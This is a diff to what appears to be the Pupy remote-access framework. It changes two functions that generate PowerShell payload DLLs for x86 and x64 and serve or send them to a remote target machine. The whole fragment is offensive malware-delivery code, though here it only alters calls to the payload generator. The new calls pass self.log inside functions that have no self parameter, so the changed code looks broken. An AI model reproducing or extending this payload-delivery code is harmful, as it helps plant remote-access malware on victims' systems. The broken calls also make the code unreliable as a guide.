@@ -142,8 +142,8 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         # generate both pupy dll to gain time response
         print colorize("Generating puppy dll to gain server reaction time. Be patient...", "red")
         tmpfile    = tempfile.gettempdir()
-        output_x86 = pupygen.generate_ps1(conf, output_dir=tmpfile, x86=True)
-        output_x64 = pupygen.generate_ps1(conf, output_dir=tmpfile, x64=True)
+        output_x86 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x86=True)
+        output_x64 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x64=True)
 
         stage2_x86 = open(output_x86).read()
         stage2_x64 = open(output_x64).read()
@@ -200,8 +200,8 @@ def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     print " --- "
     print colorize("Generating puppy dll. Be patient...", "red")
     tmpfile    = tempfile.gettempdir()
-    output_x86 = pupygen.generate_ps1(conf, output_dir=tmpfile, x86=True)
-    output_x64 = pupygen.generate_ps1(conf, output_dir=tmpfile, x64=True)
+    output_x86 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x86=True)
+    output_x64 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x64=True)
     ps1_x86 = open(output_x86).read()
     ps1_x64 = open(output_x64).read()
     raw_input("[?] Press <enter> if you are ready to connect (to remote target)")
